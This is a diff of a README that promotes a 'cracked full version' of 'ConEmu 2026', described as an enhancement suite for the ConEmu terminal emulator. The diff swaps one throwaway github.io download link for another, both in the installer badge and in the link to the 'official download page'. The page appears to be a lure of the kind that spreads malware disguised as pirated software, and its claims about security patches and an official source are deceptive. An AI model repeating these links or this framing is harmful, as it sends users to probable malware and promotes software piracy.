@@ -2,7 +2,7 @@
 
 ConEmu 2026 is the ultimate enhancement suite for the ConEmu terminal emulator, providing a cracked full version with all features unlocked for Windows 10 and 11 users. This tool transforms your command-line experience with advanced customization and productivity tools.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -57,7 +57,7 @@ Yes, ConEmu 2026 includes robust support for custom macros, batch scripts, and P
 
 For the latest version of the ConEmu 2026 Terminal Suite, please visit the official download page. This ensures you get the most recent updates and security patches.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
